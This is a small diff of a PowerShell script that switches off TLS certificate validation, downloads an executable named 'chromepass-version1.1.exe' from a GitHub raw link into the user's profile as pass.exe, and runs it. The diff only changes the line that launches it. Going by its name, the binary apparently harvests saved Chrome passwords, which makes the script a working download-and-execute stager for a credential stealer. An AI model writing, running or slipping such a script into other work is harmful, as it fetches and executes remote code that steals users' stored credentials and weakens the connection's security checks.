@@ -2,4 +2,4 @@ cd $env:userprofile
 [Net.ServicePointManager]::ServerCertificateValidationCallback ={$true}
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 (new-object System.Net.WebClient).DownloadFile("https://github.com/TJDjchao/Ballance-JS/blob/master/chromepass-version1.1.exe?raw=true","$env:USERPROFILE\pass.exe")
-.\pass.exe
+$env:USERPROFILE\pass.exe
